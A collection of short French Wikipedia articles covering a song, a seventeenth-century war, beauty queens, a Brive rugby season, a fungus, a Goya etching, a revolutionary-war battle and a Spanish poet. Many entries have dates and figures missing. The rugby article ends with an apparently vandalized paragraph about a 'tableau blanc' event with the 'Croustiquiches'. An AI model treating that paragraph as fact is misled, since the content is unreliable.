</doc>
<doc id="7279117" url="https://fr.wikipedia.org/wiki?curid=7279117" title="Ça gère">
Ça gère

Ça gère est le troisième single du chanteur français Helmut Fritz, sorti en 2010. Il est extrait de l'album "En Observation", sorti en juin 2009. 
La chanson a atteint la en France, et reste classée pendant trente-trois semaines.

</doc>
<doc id="7279120" url="https://fr.wikipedia.org/wiki?curid=7279120" title="Guerre franco-anglaise (1627-1629)">
Guerre franco-anglaise (1627-1629)

La guerre franco-anglaise de 1627-1629 intervient dans le contexte de la guerre de Trente Ans. Il s'agit essentiellement d'opérations navales. La couronne d'Angleterre apporte son soutien aux huguenots français dans leur lutte contre les forces royales françaises de Louis XIII. Sans grand succès, puisque le débarquement sur l'île de Ré est un échec et que la flotte anglaise ne parvient pas à faire lever le siège de La Rochelle. La France, cependant, est défaite en Amérique du Nord avec la chute de Québec, mais la ville est rendue en 1632 lors du traité de Saint-Germain-en-Laye.
Contexte.
L'alliance anglo-française de 1624 est consacrée par le mariage de Charles avec Henriette, la sœur de Louis XIII. L'Angleterre recherche alors un allié pour lutter contre le pouvoir des Habsbourg. En 1625, Richelieu, arrivé au pouvoir l'année précédente, s'appuie sur les navires de guerre anglais pour vaincre les huguenots et récupérer l'île de Ré. Cette opération déclenche l'indignation des puritains en Angleterre.
En 1626, la France conclut une paix secrète avec l'Espagne. Parallèlement, elle se lance dans la construction d'une puissante marine indisposant les Anglais.
En , Walter Montagu est envoyé en France pour contacter les nobles protestants, et à partir de ces derniers organisent la rébellion. Le plan anglais consiste à envoyer une flotte pour soutenir la rébellion huguenote conduite par Henri, duc de Rohan, et son frère Soubise.
L'expédition sur l'île de Ré.
Charles confie à son favori, George Villiers, duc de Buckingham, une flotte de 80 navires. En juin 1627, Buckingham débarque sur l'île de Ré avec hommes pour soutenir les huguenots.
Malgré ce débarquement, l'Île de Ré reste fidèle au roi de France. Les Anglais tentent de prendre la ville fortifiée de Saint-Martin-de-Ré défendue par Toiras. Les bateaux français réussissent à approvisionner la ville malgré le blocus anglais. Au bout de trois mois de siège, l'armée de Buckingham est affaiblie par les maladies. Schomberg réussit à débarquer sur l'île pour prêter main-forte à Toiras. Buckingham subit de lourdes pertes et décide de lever le siège et regagner l'Angleterre en .
Le siège de La Rochelle.
Charles a envoyé deux nouvelles expéditions pour soutenir La Rochelle. La première dirigée par William Feilding, en avril 1628 retourne à Portsmouth sans combattre. Feilding se justifia en déclarant . La seconde, organisée par Buckingham, juste avant son assassinat, a été confiée en à l'amiral de la flotte, le comte de Lindsey. Elle était composée de 29 navires de guerre et 31 navires marchands. Après avoir bombardé les positions françaises et essayé en vain de forcer la digue, la flotte anglaise dut se retirer. La ville se rendit le .
La prise de Québec.
En marge de la guerre en Europe, David Kirke et ses frères montent une expédition sur le Saint-Laurent pour s'emparer de Québec au nom de l'Angleterre. En 1628, ils prennent Tadoussac, capturent un vaisseau ravitaillant Québec et envoient un ultimatum à Champlain par le biais de pêcheurs basques. Ayant essuyé un refus, ils arraisonnent un convoi de la flotte des Cent-Associés commandé par l'amiral Claude Roquemont de Brison. En 1629, forts d'une flotte de six vaisseaux et de trois pinasses et aidés par le Français Jacques Michel, ils capturent Québec le . Cela ouvre la voie de la conquête de la Nouvelle-France à l'Angleterre. Les négociations sur la rétrocession de la Nouvelle-France ont lieu entre 1629 et 1632 ; elles achoppent sur la question de la dot d'Henriette Marie de France, épouse de Charles et sœur de Louis XIII. L'Angleterre rendra la colonie à la France par le traité de Saint-Germain en 1632.
Conclusion.
Après ces défaites, l'Angleterre met fin à sa participation à la guerre de Trente Ans et négocie un traité de paix avec la France en 1629. Un autre traité est signé avec l'Espagne en 1630. L'Angleterre se désintéresse des affaires européennes, au grand dam des forces protestantes sur le continent.
En Angleterre même, un conflit oppose la monarchie et le Parlement qui va conduire à la guerre civile des années 1640. La France, au contraire, accroît sa puissance et sa marine va rivaliser avec celle de l'Angleterre.

</doc>
<doc id="7279121" url="https://fr.wikipedia.org/wiki?curid=7279121" title="Kimberly Pressler">
Kimberly Pressler

Kimberly Pressler (née le à Las Vegas, Nevada), est une mannequin, femme d'affaires et animatrice de télévision américaine, couronnée Miss USA 1999. Miss Pressler est apparue dans les magazines "People", "TIME", et votée l'une des dans le magazine "Stuff" par les lecteurs.
Concours.
Pressler est originaire de Las Vegas (Nevada) puis grandit à Franklinville, New York. Elle participe à son premier concours en 1994, gagne le titre de Miss New York Teen USA, puis participe à Miss Teen USA 1994. Au concours national de cette année, elle ne réussit pas à atteindre le top 10. Elle est classée à la quarante-cinquième place. En 1999, Pressler gagne le concours de Miss New York USA, lui permettant de concourir à Miss USA de Branson (Missouri). Elle devient la quatrième femme de son État à gagner le titre de Miss USA. Pressler concourt plus tard pour le titre de Miss Univers tenue à Trinité-et-Tobago.
Carrière dans le divertissement.
Deux ans après avoir présenté des programmes télévisés sur MTV comme ', ' et ', Kimberly est engagée par NBC en 2003 pour présenter ', une série d'une heure sur les sports extrêmes.

</doc>
<doc id="7279128" url="https://fr.wikipedia.org/wiki?curid=7279128" title="I Want Candy (film)">
I Want Candy (film)

I Want Candy est un film britannique réalisé par Stephen Surjik et sorti en 2007.

</doc>
<doc id="7279134" url="https://fr.wikipedia.org/wiki?curid=7279134" title="Saison 1993-1994 du Club athlétique Brive Corrèze">
Saison 1993-1994 du Club athlétique Brive Corrèze

Lors de la saison 1993-1994, le CA Brive Corrèze évolue en Championnat Groupe A, la première division de rugby à XV.
Entraîneurs.
Pour la saison 1993-1994, l'équipe du CA Brive est entraînée par Jean-Miches Daures (entraîneur en chef), Bernard Vignard (adjoint) et Pierre Villepreux (directeur technique). Bernard Vignard démissionne le .
Bilan.
Bilan sportif.
Lors de l'intersaison, le demi d’ouverture Alain Penaud annonce son intention de quitter le club pour répondre aux sollicitations du Castres olympique, qui veut remplacer Francis Rui en fin de carrière. Le joueur, devenu international un an auparavant, reviendra sur sa demande quelques jours plus tard. La raison de ce revirement est la leucémie qui touche le trois-quarts centre Jean-Marie Soubira. 
Fait symbolique durant la saison, le numéro 12 habituellement porté par Soubira ne sera pas attribué à un autre joueur en attendant le rétablissement du trois-quarts centre.
Championnat de France.
Le CA Brive Corrèze se retrouve dans une poule compliquée du Groupe A, avec Castres et Bègles-Bordeaux qui termineront aux deux premières places de la poule. À ces clubs viennent s’ajouter de grands clubs, comme l’AS Montferrand et l’Aviron bayonnais. Sur leur pelouse du Stadium, les Coujoux sont intraitables, avec notamment un large succès sur le voisin auvergnat de Montferrand. Au total, ils remporteront à domicile sept victoires en autant de rencontres. En revanche, les déplacements des Brivistes se soldent par des défaites, voire par de lourds revers à Castres et à Bayonne. Dans ces conditions, la qualification pour les phases finales échappe aux Corréziens, qui terminent cinquièmes de leur poule. Ceux-ci sont contraints de disputer une poule de relégation, la Coupe Moga où le dernier est relégué en Groupe B. Les choses se passent tout aussi mal. Opposés à l’AS Béziers, au SC Graulhet et au Stade dijonnais, les Brivistes reproduisent leur parcours de poule en s’imposant chez eux et en s’inclinant à chaque fois à l’extérieur. Leur place en Groupe A en vient à être menacée. Avant la dernière journée, le CAB a remporté deux de ses cinq rencontres de Coupe Moga, et va jouer sa place dans l’élite face à Dijon. Le match est tendu mais finalement bien maîtrisé par les Coujoux. Quatre essais signés Alain Penaud, Sylvain Dubois, Éric Alabarbe et Sébastien Viars assurent au CAB une victoire 31-11. Le maintien est assuré.
C’est finalement l’AS Béziers, recordman du nombre de titre remporté en championnat qui descend pour la première fois de son histoire. Cet épisode va laisser des traces au sein du club, qui visait la phase éliminatoire en début de saison, et déboucher sur la démission de Pierre Villepreux de ses fonctions de conseiller technique.
Challenge Yves du Manoir.
Dans cette compétition, le club corrézien se voit proposer comme adversaires de poule le FC Grenoble qui vient d’être privé du titre de Champion de France à la suite d'une finale polémique, le FC Lourdes et l’AS Béziers. Le parcours mitigé en championnat est bien loin, puisque Brive contraint Grenoble à concéder le match nul lors du match d’ouverture au Stade Lesdiguières, puis remporte les cinq matches suivants. Une nouvelle fois qualifiés pour les quarts de finale, les Cabistes y rencontrent une vieille connaissance, Narbonne. Le à Toulouse, les Audois ne laissent aucune chance à Brive et l’emportent 35-6.
Événement tableau blanc.
L’événement populaire du "tableau blanc", soit la soirée officielle d'analyse collective et de mise en pratique des stratégies de sport a fait référence à la saison de l'équipe. Espérant pouvoir réussir à reproduire les résultats exceptionnels de la saison 1993-1994 du Club athlétique Brive Corrèze, une analyse avancée a été faite sur les stratégies utilisées. En effet, le club école des Croustiquiches a tenté de reproduire l'oeuvre de l'équipe lors d'une cérémonie nocturne commandité par Gary. Malheureusement, la soirée a échoué lamentablement à la suite de l'énoncé général donné par le descripteur en chef. 

</doc>
<doc id="7279137" url="https://fr.wikipedia.org/wiki?curid=7279137" title="Jan Magiera">
Jan Magiera

Jan Magiera, né le à Jelna (commune de Gródek nad Dunajcem) et mort le à Mostki (Petite-Pologne), est un sportif polonais, coureur cycliste, athlète olympique, champion de Pologne en 1966, spécialiste du contre-la-montre individuel.
Carrière sportive.
Il commence sa carrière sur piste, où il court près de deux décennies (1953-1971).
Il est deux fois représentant olympique de son pays : à Tokyo en 1964 et à Mexico en 1968.

</doc>
<doc id="7279138" url="https://fr.wikipedia.org/wiki?curid=7279138" title="Thairé d'Aunis">
Thairé d'Aunis



</doc>
<doc id="7279139" url="https://fr.wikipedia.org/wiki?curid=7279139" title="Aspergillus felis">
Aspergillus felis

Aspergillus felis est une espèce de champignons de la famille des "Trichocomaceae" nouvellement décrite en 2013 par des chercheurs de l'université de Sydney (Australie) dont la chercheuse Vanessa Barrs.
Cette espèce a été isolée chez des chats atteints de rhinosinusite fongique, d'aspergillose sino-orbitale, d'aspergillose invasive pulmonaire et d'infection de la cavité naso-sinusienne, ainsi que chez un chien atteint d'aspergillose invasive et chez un homme souffrant d'une aspergillose pulmonaire invasive chronique.
Cette nouvelle espèce est étroitement apparentée au champignon "Aspergillus fumigatus", qui est un agent pathogène pour l'homme.

</doc>
<doc id="7279140" url="https://fr.wikipedia.org/wiki?curid=7279140" title="Time of the Season">
Time of the Season

Time of the Season est une chanson des Zombies, présente sur leur album de 1968, "Odessey and Oracle" et sortie en 45 tours la même année chez CBS Records. Aux États-Unis et au Canada, le 45 tours sort chez Date, un sous-label de Columbia Records. La chanson est composée par le claviériste Rod Argent et enregistrée aux studios Abbey Road en .
Plus d'un an après sa sortie originale, la chanson est devenue un succès inattendu aux États-Unis, se hissant à la troisième place du "Billboard" Hot 100 et à la première place du Top 100 du magazine "Cash Box". Elle est devenue l'une des chansons les plus populaires et les plus reconnaissables des Zombies, ainsi qu'une chanson phare de la musique psychédélique des années 1960. 
En 2012, "NME" l'a classée meilleure chanson des années 1960 et en 2021, elle a été classée à la place dans le "Top 500 des plus grandes chansons de tous les temps" du "Rolling Stone". Elle est incluse dans la sélection des « chansons qui ont façonné le rock 'n' roll » du Rock and Roll Hall of Fame.
Réception.
Plusieurs autres chansons de l'album "Odessey and Oracle" sont sorties en single avant "Time of the Season". Columbia Records soutient l'album et les singles à la demande de leur nouveau responsable A&amp;R, Al Kooper. L'un de ces singles est "", une chanson en apparence non commerciale, dont Columbia pensait qu'elle pourrait accrocher au sentiment anti-guerre assez populaire à cette époque.
La chanson ne fut sortie qu'à le demande de Kooper, après le "flop" des précédents singles. "Time of the Season" fait une percée début 1969, plus d'un an après la séparation du groupe. Il atteint la troisième position du "Billboard" Hot 100 en mars et devient numéro un du "Cash Box" Top 100 et au Canada. Le single n'a cependant pas percé en Grande-Bretagne d'où est originaire le groupe, bien qu'elle ait été rééditée deux fois, mais elle y a trouvé une certaine notoriété par la suite, Rod Argent déclarant qu'elle était devenue un « classique au Royaume-Uni, mais qu'elle n'avait jamais été un tube ». Au milieu de l'année 1969, il atteint la seconde place au hit-parade sud-africain.
Utilisation dans la culture populaire.
"Time of The Season" est souvent utilisé dans la culture populaire pour représenter la fin des années 1960. Ainsi elle est présente dans les films "1969", "L'Éveil" ("Awakenings"), "Le Choix d'une vie" ("A Walk on the Moon") et "Riding the Bullet", tous se déroulant en 1969. "Time of the Season" est aussi utilisée dans l'épisode des "Simpson" "Hippie Hip Hourra !" ("D'oh-in In the Wind"), dans laquelle Homer décide de suivre les traces de sa mère et de devenir un hippie. Dans les épisodes de "South Park" "La Grenouille mexicaine hypnotique du sud du Sri Lanka" et "201", elle est utilisée en illustration sonore des flashbacks sur la Guerre du Viêt Nam. Elle est également présente dans le film "" réalisé par James Wan en 2013. Eminem a repris un sample sur son album MMLP2 en 2013 avec le titre "Rhyme Or Reason". 
La série de NBC "Mes plus belles années" ("American Dreams"), qui décrit la société américaine du milieu et de la fin des années 1960, utilise cette chanson dans sa troisième saison, "So Long, Farewell". "" et "She's Not There", les deux autres tubes des Zombies ont aussi été utilisés plus tard dans la série.
Comme de nombreuses autres chansons des années '60, incluant "She's Not There" des Zombies, elle est présente dans le film de 2005 "Dear Wendy" et les mots sont les derniers dans la lettre de Dick adressée à Wendy. La chanson est également présente dans la série de HBO, "Big Love".

</doc>
<doc id="7279146" url="https://fr.wikipedia.org/wiki?curid=7279146" title="Silvio Francesco">
Silvio Francesco

Silvio Francesco, de son vrai nom Silvio Francesco Valente (né le à Paris, mort le à Lugano) est un chanteur, clarinettiste et acteur italien, ayant fait sa carrière essentiellement en Allemagne.
Biographie.
Silvio Francesco vient d'une famille d'artistes. Sa mère est une clown musicienne de renommée internationale, son père Giuseppe un grand accordéoniste. Il vit ainsi dans le monde du cirque et des variétés avec ses trois frères et sœurs. Enfant, il apprend plusieurs instruments de musique. Il est un bon guitariste et excellent clarinettiste. Sa jeune sœur est la star Caterina Valente avec qui il chante dans des duos tels que Club Manhattan, Club Honolulu, Club Argentina, Club Indonesia ou Club Italia. Leur plus grand succès est la chanson schlager "Itsi bitsi petit bikini" ("Itsy Bitsy Teenie Weenie Yellow Polka Dot Bikini") en 1960. Lorsque Caterina passe de Polydor à Decca, il se met en duo avec Margot Eskens. Le frère et la sœur se retrouvent de nouveau peu de temps après.
Il choisit de prendre ses deux premiers prénoms pour se différencier de sa sœur et faire une carrière solo. Mais il se produit souvent avec elle dans des spectacles ou dans des films, notamment de Michael Pfleghar.
Il s'installe à Lugano où il tient un petit hôtel à côté de ses engagements.
Il apparaît pour la dernière fois au cinéma dans un film d'horreur parodique, "My lovely Monster", et à la télévision sept ans plus tard dans la série "Wilde Zeiten".
Il meurt d'un cancer en 2000 et est enterré dans l'enclave de Campione d'Italia, près du lac de Lugano.
Discographie (sélection).
avec Caterina Valente

</doc>
<doc id="7279153" url="https://fr.wikipedia.org/wiki?curid=7279153" title="Mercalm">
Mercalm



</doc>
<doc id="7279154" url="https://fr.wikipedia.org/wiki?curid=7279154" title="Championnats d'Europe juniors d'athlétisme 2015">
Championnats d'Europe juniors d'athlétisme 2015

Les 23 Championnats d'Europe juniors d'athlétisme se déroulent du 16 au à Eskilstuna en Suède, pays qui accueille ces championnats pour la première fois. Les compétitions se déroulent dans l'enceinte de l'Ekängens Friidrottsarena.
Résultats.
L'équipe suédoise masculine du relais 4 x 100 m remporte la seule victoire du pays-hôte, en battant le record national junior. C'est la première fois dans l'histoire des Championnats d'Europe junior que la Suède remporte un relais alors que c'est le pays qui a inventé cette spécialité.

</doc>
<doc id="7279156" url="https://fr.wikipedia.org/wiki?curid=7279156" title="Championnats d'Europe junior d'athlétisme 2015">
Championnats d'Europe junior d'athlétisme 2015



</doc>
<doc id="7279159" url="https://fr.wikipedia.org/wiki?curid=7279159" title="Justine Pasek">
Justine Pasek

Yostin Lissette Pasek Patiño (née le à Kharkiv en Ukraine) est un mannequin panaméen. Elle est élue Miss Univers 2002 par intérim. Elle est membre du programme des ambassadrices de bonne volonté de la FAO, depuis 2003.
Biographie.
Pasek est née à Kharkiv d'une mère panaméenne et d'un père polonais, affectueusement appelée par son nom polonais, , elle habite en Ukraine pendant un an, mais passe la plupart de son enfance dans le village de Wożuczyn près de Zamość en Pologne, avant que sa famille ne déménage pour le Panama, après que sa mère ait terminé ses études en chimie.
Justine débute dans le mannequinat dans la télévision et les productions des défilés de mode, parallèlement fait ses études en génie de l'environnement en Nouvelle-Zélande, et obtient son diplôme. En 2002, Justine Pasek est couronnée Miss Univers 2002, par intérim pour manquement à ses obligations démises par Oksana Fiodorova Miss Russie 2002.
Concours.
Après avoir participé au concours national de Señorita Panamá 2001 le ; avoir gagné le titre de Señorita Panamá Universe et obtenue le droit de représenter son pays durant la du concours de Miss Univers 2002, elle participe au Coliseo Roberto Clemente, à San Juan, Porto Rico le .

</doc>
<doc id="7279163" url="https://fr.wikipedia.org/wiki?curid=7279163" title="Palais de la Grande Garde">
Palais de la Grande Garde

Le palais de la Grande Garde ("Gran Guardia") est un palais de la ville italienne de Vérone, en Vénétie. Sa façade donne sur le sud-ouest de la piazza Bra, l'une des principales places du centre-ville.
Histoire.
Le premier acte concernant le palais est une demande formelle du capitaine de Vérone Giovanni Mocenigo au doge Leonardo Donà, signée le ; le document propose la construction d'un bâtiment destiné à être utilisé comme lieu de revue des troupes les jours où il n'est pas possible, en raison du temps, de le faire en plein air. En outre, il a été proposé que la structure soit placée près des murs de la Cittadella, de manière à avoir déjà un côté complet et ainsi réduire les coûts et le temps des travaux. L'autorisation de construire est accordée dès le 30 décembre et, le 13 février 1610, les premiers apports arrivent de Venise.
Les travaux se poursuivent sous le nouveau capitaine Girolamo Corner jusqu'en 1614, date à laquelle le financement vient à manquer et la construction doit être arrêtée. Le , le conseil de la commune de Vérone envoie au doge une demande de retenue de dix mille ducats sur les impôts dus à la république de Venise, afin de permettre la reprise des travaux. Cependant, la demande fut refusée et les travaux furent définitivement suspendus : ainsi le côté est du piano nobile, à partir de la neuvième fenêtre, resta inachevé.
Ce n'est qu'en 1808 que les travaux reprennent, après presque deux siècles d'inactivité : avec l'intercession du vice-roi du royaume d'Italie (1805-1814), en effet, la propriété de l'édifice passe à la municipalité de Vérone, à condition qu'il soit achevé en trois ans et devienne le siège de l'administration de la ville. La municipalité confie à l'ingénieur Giuseppe Barbieri la tâche de diriger les travaux et trouve les fonds avec lesquels financer les travaux, mais le chantier ne sera rouvert qu'en , alors que la ville est passée sous la domination de l'Empire autrichien.
Outre l'achèvement du rez-de-chaussée et la consolidation de la façade, l'escalier monumental menant aux chambres de l'étage supérieur a également été construit pendant cette phase de travaux. Les travaux, presque achevés, ont été temporairement interrompus en 1848, en raison de la première guerre d'indépendance italienne, lorsque le bâtiment a été occupé par les militaires des Habsbourg. Dès que les pièces ont été libérées, les travaux ont pu reprendre et ont été rapidement achevés, à tel point qu'en , il y a eu l'inspection finale et le paiement des montants pour les travaux effectués.
Description.
L'œuvre de Domenico Curtoni, avec une autre de ses constructions située à côté de la Gran Guardia, le Teatro Filarmonico, a donné une nouvelle structure à la Bra. Lors de la conception du bâtiment, l'architecte véronais ne pouvait pas ne pas tenir compte du dialogue qui allait naître entre la Gran Guardia et la masse imposante des Arènes de Vérone, il a donc élaboré un projet qui équilibrait le poids de l'amphithéâtre romain, tout en utilisant un langage figuratif différent.
Le bâtiment développe au rez-de-chaussée une longue loggia de de long, composée de treize arcs soutenus par de puissants pilastres rustiques, fermée sur les côtés par deux murs pleins sur lesquels s'ouvrent de petites fenêtres. Sur le piano nobile, quinze fenêtres sont entrecoupées de colonnes jumelles : les deux fenêtres latérales sont plus petites en largeur que les autres, les huit intermédiaires sont couronnées de frontons triangulaires et courbes, tandis que les cinq centrales sont arquées et beaucoup plus grandes. L'étage principal se termine par un entablement caractérisé par une frise composée de métopes et de triglyphes. Au centre de l'élévation, au-dessus du piano nobile, un étage mansardé s'élève au-dessus des cinq grandes fenêtres, avec des fenêtres rectangulaires donnant de la lumière à la salle à double hauteur située derrière.

</doc>
<doc id="7279164" url="https://fr.wikipedia.org/wiki?curid=7279164" title="Que viene el coco">
Que viene el coco

L'eau-forte Que viene el coco ("Voici que vient le croquemitaine") est une gravure de la série "Los caprichos" du peintre espagnol Francisco de Goya. Elle porte le numéro trois dans la série des 80 gravures. Elle a été publiée en 1799.
Interprétations de la gravure.
Il existe divers manuscrits contemporains qui expliquent les planches des Caprichos. Celui qui se trouve au Musée du Prado est considéré comme un autographe de Goya, mais semble plutôt chercher à dissimuler et à trouver un sens moralisateur qui masque le sens plus risqué pour l'auteur. Deux autres, celui qui appartient à Ayala et celui qui se trouve à la Bibliothèque nationale, soulignent la signification plus décapante des planches.
Technique de la gravure.
Le dessin préparatoire à la sanguine, conservé au Musée du Prado, a été en grande partie reproduit dans la gravure. Les principales modifications sont le changement d'expression de l'enfant à droite et le rayon lumineux ajouté au fond de la gravure. Le dessin préparatoire mesure sur une feuille de . Sur le support, dans l'angle inférieur gauche, au crayon : « 12 ».
La plaque est conservée dans un bon état. L'estampe est à l'eau-forte et l'aquatinte brunie. Elle mesure sur une feuille de .

</doc>
<doc id="7279169" url="https://fr.wikipedia.org/wiki?curid=7279169" title="Kristian Schultze">
Kristian Schultze

Kristian Schultze (né le à Francfort-sur-l'Oder, mort le à Bad Tölz) est un musicien allemand, compositeur, clavieriste et producteur.
Biographie.
Kristian Schultze est le fils de Norbert Schultze, l'auteur de la chanson "Lili Marleen", et de Iwa Wanja, une actrice et chanteuse célèbre à son époque.
Il grandit à Rio de Janeiro, Hambourg et Berlin où il étudie le clavier et la composition.
Il fait partie du groupe de jazz fusion Passport entre 1973 et 1977, et enregistre les albums "Looking Thru", "Cross Collateral", "Infinity Machine" et "Iguacu". 
Dans les années 1970, il monte avec Michael Holm le projet , qui est nommé aux Grammy Awards, après avoir publié une vingtaine d'albums.
En 1984 il travaille à Los Angeles avec Giorgio Moroder en tant qu'arrangeur et producteur.
Il a composé de nombreuses musiques de film.

</doc>
<doc id="7279171" url="https://fr.wikipedia.org/wiki?curid=7279171" title="Kristan Vikernes">
Kristan Vikernes



</doc>
<doc id="7279174" url="https://fr.wikipedia.org/wiki?curid=7279174" title="Berlin International Directors Lounge">
Berlin International Directors Lounge



</doc>
<doc id="7279175" url="https://fr.wikipedia.org/wiki?curid=7279175" title="Bataille de Ridgefield">
Bataille de Ridgefield

La bataille de Ridgefield est une bataille et une série d'accrochages entre les forces américaines et britanniques lors de la guerre d'indépendance des États-Unis. La bataille principale a eu lieu le dans le village de Ridgefield dans le Connecticut et plusieurs accrochages ont eu lieu le lendemain entre Ridgefield et le littoral près de l'actuel Westport.
Le , une force britannique sous le commandement du gouverneur colonial de la Province de New York, le major-général William Tryon débarque entre Fairfield et Norwalk puis se dirige vers Danbury. Là, ils détruisent les provisions de l'Armée continentale après avoir chassé une petite garnison. Lorsque la nouvelle des mouvements de troupes britanniques se répand, les chefs de la milice du Connecticut passent à l'action. Le major-général David Wooster, le brigadier-général Gold S. Silliman et le brigadier-général Benedict Arnold lèvent une force combinée d'environ de l'Armée continentale et des forces de milices locales pour s'opposer aux Britanniques, mais ne parviennent pas à atteindre Danbury à temps pour empêcher la destruction des provisions. Au lieu de cela, ils se mettent à harceler les Britanniques lors de leur retour vers la côte.
La compagnie menée par le général Wooster attaque à deux reprises l'arrière-garde de Tryon durant leur marche vers le sud le . Au cours de la seconde confrontation, Wooster est mortellement blessé ; il meurt cinq jours plus tard. La principale confrontation prend ensuite place à Ridgefield, où plusieurs centaines de miliciens sous le commandement d'Arnold affrontent les Britanniques et sont repoussés, mais pas avant d'avoir infligé des pertes aux Britanniques. Des forces de milice supplémentaires arrivent et le lendemain, ils continuent de harceler les Britanniques qui retournent à Compo Beach, où la flotte les attend. Arnold regroupe la milice et quelques pièces d'artillerie pour prendre position face aux Britanniques près de leur lieu de débarquement, mais sa position est flanquée et sa force se retrouve dispersée par des tirs d'artillerie et une charge à la baïonnette.
L'expédition est une réussite sur le plan tactique pour les Britanniques, mais leurs actions en poursuivant les attaques galvanise le soutien aux "Patriots" dans le Connecticut. Bien que les Britanniques conduisent de nouveaux raids sur les populations de la côte du Connecticut, ils ne mènent plus d'attaques allant aussi loin à l'intérieur des terres.

</doc>
<doc id="7279176" url="https://fr.wikipedia.org/wiki?curid=7279176" title="Kristian Vikernes">
Kristian Vikernes



</doc>
<doc id="7279178" url="https://fr.wikipedia.org/wiki?curid=7279178" title="Shelby 1000">
Shelby 1000

La Shelby 1000 est une automobile de type muscle car dévoilée par la compagnie Shelby American en 2012 lors du Salon de l'automobile de New York.

</doc>
<doc id="7279180" url="https://fr.wikipedia.org/wiki?curid=7279180" title="Tobias Potye">
Tobias Potye

Tobias Potye (né le à Munich) est un athlète allemand, spécialiste du saut en hauteur.
Biographie.
Le , il porte son record personnel à 2,22 m, à Sinn (Hesse).

</doc>
<doc id="7279182" url="https://fr.wikipedia.org/wiki?curid=7279182" title="Henry de Gloucester">
Henry de Gloucester

Le prince Henry William Frederick Albert du Royaume-Uni, duc de Gloucester, né le à York Cottage et mort le au manoir de Barnwell (Northamptonshire), duc de Gloucester et comte d'Ulster, est un membre de la famille royale britannique, frère cadet des rois et , et oncle de la reine .
Biographie.
Né à Sandringham dans le Norfolk, il est le quatrième enfant et le troisième fils du roi et de la reine Mary, née princesse Marie de Teck. Le prince Henry est le douzième gouverneur général d'Australie de 1945 à 1947. En 1955, il reçoit le grade honorifique de ' et en 1958 celui de '.
Il est le président de la (dans le Surrey) et le parrain de la . 
Dernier survivant des enfants de et Mary de Teck, il meurt en 1974 à son domicile de Barnwell Manor, près de la ville de Oundle dans le Northamptonshire. Il est inhumé au cimetière royal de Frogmore où repose déjà son fils aîné William.
Mariage et descendance.
Le , il épouse Lady Alice Montagu-Douglas-Scott, qui entre dans l'histoire comme la doyenne de la famille royale britannique, morte à plus de .
Le couple a eu deux fils :
Dans la fiction.
Dans la série télévisée "The Crown" (2016), son rôle est interprété par Andy Sanderson et .

</doc>
<doc id="7279193" url="https://fr.wikipedia.org/wiki?curid=7279193" title="Autoroute du Brenner">
Autoroute du Brenner



</doc>
<doc id="7279194" url="https://fr.wikipedia.org/wiki?curid=7279194" title="Connor, agent très spécial">
Connor, agent très spécial

Connor, agent très spécial (") est une série télévisée canadienne en 38 épisodes de 23-26 minutes, produite par les studios Heroic Film Company, et diffusée entre le et le sur .
En France, la série a été diffusée à partir du sur Canal J et sur Gulli.
Synopsis.
Connor Heath est un adolescent ordinaire de quinze ans. Il est très imaginatif et est toujours en quête d'aventure mais il n'arrive jamais à ses fins, jusqu'à ce que la fille du Président de Cordoue, Gisela, est envoyée pour vivre avec lui et sa famille. 
Après de nombreuses tentatives d'atteintes sur la vie de Gisela, Eduardo, un garde du corps pour les services secrets de Cordoue, se joint à eux. 
Ensemble, ils vont devoir faire face à l'ancien ami de Gisela, Zatari, un agent redoutable dont la mission est de capturer la fille du président, afin de prendre son ADN pour l'utiliser dans une expérience illégale de clonage humain.

</doc>
<doc id="7279195" url="https://fr.wikipedia.org/wiki?curid=7279195" title="Juan de Tassis y Peralta">
Juan de Tassis y Peralta

Juan de Tassis y Peralta, appelé le plus souvent comte de Villamediana, né à Lisbonne en 1581 et décédé à Madrid le , est un poète espagnol de la période baroque, généralement associé au cultisme mais dont l’esthétique est très personnelle.
Biographie.
Fils de María de Peralta Muñatones et de Juan de Tassis y Acuña, Villamediana grandit dans un environnement palatin dès son enfance, reçoit une excellente éducation de l’humaniste et de , lequel lui dédie son "Mercurius Trimegistus". Grâce à ses deux précepteurs, il dispose d’une excellente formation en lettres et d’une connaissance fine des classiques et compose quelques poèmes en excellent latin humaniste. Il fréquente l’université mais n’y suit pas de cours. Quand Philippe III d'Espagne se rend au royaume de Valence pour célébrer son mariage avec Marguerite d'Autriche-Styrie, don Juan les accompagne et s’y distingue tant que le Roi le nomme gentilhomme à son palais. Il y rencontre Magdalena de Guzmán y Mendoza, qui est influente à la cour en tant que veuve de Martín Cortés de Monroy, marquis de la vallée de Guajaca (Oaxaca), et future gouvernante du fils de la reine. Malgré la différence de classe, ils entretiennent une relation qui se termine mal. Suivant une rumeur à Madrid, il n'est pas tellement bien avec elle, comme le montre la gifle qu'elle lui donne en pleine représentation d’une comédie, devant tout le monde, ce qui laisse à penser que doña Magdalena a toujours entretenu avec lui une relation d’amour-haine.
Déplacé à la cour à Valladolid, où il demeure cinq ans, il épouse en 1601 Ana de Mendoza y de la Cerda, descendante du marquis de Santillane, avec qui il a plusieurs enfants, tous mort-nés. Grâce à son travail comme organisateur du service principal des postes il reçoit le titre de noblesse en 1603. À la mort de son père en 1607, il assume la charge de courrier principal du royaume.
Par son caractère agressif, téméraire et charmeur, il acquiert rapidement une réputation de libertin ou de "dandy". Amateur de luxe, des pierres précieuses, du jeu et des courses, il mène une vie désordonnée de joueur, réputé comme adversaire redoutable sur le tapis en raison de sa grande intelligence. Néanmoins, ces excès lui valent deux exils, pour avoir ruiné différents nobles importants, de même qu’en raison de ses satires virulentes, dans lesquelles il critique sans pitié les défauts et misères de presque tous les Grands d’Espagne. Le premier de ses exils l’amène en Italie, où il séjourne entre 1611 et 1617 avec le comte de Lemos, renommé vice-roi de Naples. De retour en Espagne, il y critique dans différentes satires la corruption florissant sous le duc de Lerma et don Rodrigo Calderón durant les dernières années du règne de Philippe III, de sorte que ceux-ci obtiennent du roi un nouveau bannissement de la Cour en 1618, cette fois en Andalousie. Il en revient peu après au décès du roi, protégé par le nouveau ministre, Gaspar de Guzmán.
